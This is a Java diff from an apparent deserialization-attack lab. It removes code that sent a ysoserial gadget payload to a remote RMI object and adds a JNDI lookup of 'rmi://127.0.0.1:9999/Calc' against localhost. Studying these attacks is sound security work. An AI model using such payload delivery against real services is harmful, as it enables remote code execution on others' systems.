@@ -5,28 +5,17 @@ import org.apache.commons.beanutils.BeanComparator;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.Reflections;
 
+import javax.naming.InitialContext;
 import java.math.BigInteger;
-import java.net.MalformedURLException;
-import java.rmi.Naming;
-import java.rmi.NotBoundException;
-import java.rmi.RemoteException;
 import java.util.PriorityQueue;
 
 
 public class RMIClint {
     public static void main(String[] args) {
         try {
-            HelloInter h = (HelloInter) Naming.lookup("rmi://0.0.0.0:1099/hello"); // 寻找RMI实例远程对象
-//            System.out.println(h.Hello("run......"));
-            h.Eeyi(getpayload());
-//            h.Hello(getpayload());
-//            h.TTTT();
-        }catch (MalformedURLException e) {
-            System.out.println("url格式异常");
-        } catch (RemoteException e) {
-            System.out.println("创建对象异常");
-        } catch (NotBoundException e) {
-            System.out.println("对象未绑定");
+//            Registry registry = LocateRegistry.getRegistry(9999);
+//            registry.lookup("xxx");
+            new InitialContext().lookup("rmi://127.0.0.1:9999/Calc");
         } catch (Exception e) {
             e.printStackTrace();
         }
